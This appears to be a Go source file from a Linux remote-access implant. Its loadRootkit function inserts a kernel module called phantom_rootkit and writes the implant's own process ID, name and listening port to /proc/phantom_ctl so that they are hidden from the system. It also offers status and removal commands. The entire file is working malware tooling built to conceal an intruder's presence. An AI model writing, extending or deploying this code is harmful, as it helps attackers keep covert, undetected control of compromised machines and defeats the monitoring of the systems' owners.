//go:build linux

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func loadRootkit(c Cmd) Result {
	sub := str(c.Args["sub"])
	if sub == "" || sub == "status" {
		out, _ := newCmd("sh", "-c", "lsmod 2>/dev/null | grep -c phantom_rootkit").Output()
		if strings.TrimSpace(string(out)) == "0" || strings.TrimSpace(string(out)) == "" {
			if _, err := os.Stat("/proc/phantom_ctl"); err == nil {
				return Result{OK: true, Out: "control node present, module not listed"}
			}
			return Result{OK: true, Out: "not loaded"}
		}
		return Result{OK: true, Out: "phantom_rootkit loaded"}
	}
	if sub == "remove" {
		out, err := newCmd("rmmod", "phantom_rootkit").CombinedOutput()
		if err != nil {
			return Result{OK: false, Out: string(out), Err: err.Error()}
		}
		return Result{OK: true, Out: "module unloaded"}
	}

	ko := str(c.Args["ko"])
	if ko == "" {
		ko = "/tmp/phantom_rootkit.ko"
	}
	port := str(c.Args["port"])
	if port == "" {
		port = "8443"
	}
	name := str(c.Args["name"])
	if name == "" {
		exe, _ := os.Executable()
		name = filepath.Base(exe)
	}

	out, err := newCmd("insmod", ko).CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: "insmod: " + err.Error()}
	}

	cfg := fmt.Sprintf("%d %s %s\n", os.Getpid(), name, port)
	f, err := os.OpenFile("/proc/phantom_ctl", os.O_WRONLY, 0644)
	if err != nil {
		return Result{OK: false, Out: string(out),
			Err: "rootkit loaded but /proc/phantom_ctl open failed: " + err.Error()}
	}
	if _, err := f.WriteString(cfg); err != nil {
		f.Close()
		return Result{OK: false, Err: "ctl write: " + err.Error()}
	}
	f.Close()

	return Result{OK: true, Out: fmt.Sprintf(
		"linux rootkit: hiding pid=%d name=%s port=%s", os.Getpid(), name, port)}
}
